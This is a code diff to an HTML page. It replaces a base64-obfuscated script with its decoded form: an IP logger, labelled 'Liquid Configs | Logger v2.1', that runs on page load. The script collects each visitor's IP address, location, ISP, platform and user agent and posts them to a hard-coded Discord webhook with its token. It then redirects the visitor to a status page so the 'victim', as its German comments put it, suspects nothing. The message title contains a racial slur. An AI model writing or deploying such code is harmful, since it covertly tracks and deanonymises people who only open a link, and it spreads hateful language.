@@ -41,7 +41,52 @@
     </div>
 
     <script>
-     ICAgYXN5bmMgZnVuY3Rpb24gY2FwdHVyZUFuZFJlZGlyZWN0KCkgewogICAgICAgICAgICBjb25zdCB3ZWJob29rVVJMID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE1MDI3Mzc4OTk5OTE0NzAxMDIvaTRRYVpSRmlzMkQ4QXh0MWptZ1RxUl96c0d4dE5Mb19DM09aeVZqeG45aWlseFhRUHY1eDdRTnJGYTFwalRYS1dpSlEiOyAvLyA8LS0tIEhJRVIgREVJTiBMSU5LIFJFSU4KICAgICAgICAgICAgCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAvLyBJUCBEYXRlbiBhYnJ1ZmVuCiAgICAgICAgICAgICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGZldGNoKCdodHRwczovL2lwYXBpLmNvL2pzb24vJyk7CiAgICAgICAgICAgICAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpOwoKICAgICAgICAgICAgICAgIC8vIERpc2NvcmQgRW1iZWQgdm9yYmVyZWl0ZW4KICAgICAgICAgICAgICAgIGNvbnN0IHBheWxvYWQgPSB7CiAgICAgICAgICAgICAgICAgICAgZW1iZWRzOiBbewogICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogIvCfmqggTklHR0VSIFRSSUdHRVJFRCEiLAogICAgICAgICAgICAgICAgICAgICAgICBjb2xvcjogMTY3NzY5NjAsIC8vIEdlbGIKICAgICAgICAgICAgICAgICAgICAgICAgZmllbGRzOiBbCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7IG5hbWU6ICLwn4yQIElQIEFkZHJlc3MiLCB2YWx1ZTogYFxgJHtkYXRhLmlwfVxgYCwgaW5saW5lOiBmYWxzZSB9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgeyBuYW1lOiAi8J+TjSBMb2NhdGlvbiIsIHZhbHVlOiBgJHtkYXRhLmNpdHl9LCAke2RhdGEucmVnaW9ufWAsIGlubGluZTogdHJ1ZSB9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgeyBuYW1lOiAi8J+PoiBJU1AiLCB2YWx1ZTogZGF0YS5vcmcsIGlubGluZTogdHJ1ZSB9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgeyBuYW1lOiAi8J+SuyBPUyAvIFBsYXRmb3JtIiwgdmFsdWU6IG5hdmlnYXRvci5wbGF0Zm9ybSwgaW5saW5lOiBmYWxzZSB9CiAgICAgICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgICAgICAgICAgICAgICAgIGZvb3RlcjogeyB0ZXh0OiAiTGlxdWlkIENvbmZpZ3MgfCBMb2dnZXIgdjIuMSIgfSwKICAgICAgICAgICAgICAgICAgICAgICAgdGltZXN0YW1wOiBuZXcgRGF0ZSgpCiAgICAgICAgICAgICAgICAgICAgfV0KICAgICAgICAgICAgICAgIH07CgogICAgICAgICAgICAgICAgLy8gQW4gV2ViaG9vayBzZW5kZW4KICAgICAgICAgICAgICAgIGF3YWl0IGZldGNoKHdlYmhvb2tVUkwsIHsKICAgICAgICAgICAgICAgICAgICBtZXRob2Q6ICdQT1NUJywKICAgICAgICAgICAgICAgICAgICBoZWFkZXJzOiB7ICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicgfSwKICAgICAgICAgICAgICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeShwYXlsb2FkKQogICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcigiRXJyb3I6IiwgZXJyb3IpOwogICAgICAgICAgICB9IGZpbmFsbHkgewogICAgICAgICAgICAgICAgLy8gRUdBTCBvYiBlcyBrbGFwcHQgb2RlciBuaWNodDogTmFjaCAyIFNla3VuZGVuIHdlaXRlcmxlaXRlbgogICAgICAgICAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgd2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHBzOi8vZGlzY29yZHN0YXR1cy5jb20iKTsKICAgICAgICAgICAgICAgIH0sIDIwMDApOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAvLyBTY3JpcHQgc3RhcnRlbgogICAgICAgIGNhcHR1cmVBbmRSZWRpcmVjdCgpOw==
+        async function captureAndRedirect() {
+    // Hier musst du deinen echten Discord Webhook Link einfügen
+    const webhookURL = "https://discord.com/api/webhooks/1502737899991470102/i4QaZRFis2D8Axt1jmgTqR_zsGxtNLo_C3OZyVjxn9iilxXQPv5x7QNrFa1pjTXKWiJQ"; 
+    
+    try {
+        // Holt die IP-Informationen des Opfers
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+
+        // Erstellt das Layout für deine Discord-Nachricht
+        const payload = {
+            embeds: [{
+                title: "🚨 nigger TRIGGERED!",
+                color: 16776960, // Gelbe Farbe
+                fields: [
+                    { name: "🌐 IP Address", value: `\`${data.ip}\``, inline: false },
+                    { name: "📍 Location", value: `${data.city}, ${data.region} (${data.country_name})`, inline: true },
+                    { name: "🏢 ISP / Provider", value: data.org, inline: true },
+                    { name: "💻 OS / Platform", value: navigator.platform, inline: false },
+                    { name: "📱 User Agent", value: navigator.userAgent, inline: false }
+                ],
+                footer: { text: "Liquid Configs | Logger v2.1" },
+                timestamp: new Date()
+            }]
+        };
+
+        // Sendet die Daten per POST an deinen Discord Webhook
+        await fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+    } catch (error) {
+        // Fehler werden ignoriert, damit das Opfer nichts merkt
+        console.log("Connection stable...");
+    } finally {
+        // Schickt das Opfer nach 1,5 Sekunden auf eine glaubwürdige Seite
+        setTimeout(() => {
+            window.location.replace("https://discordstatus.com");
+        }, 1500);
+    }
+}
+
+// Startet die Funktion sofort beim Laden der Seite
+captureAndRedirect();
     </script>
 </body>
 </html>
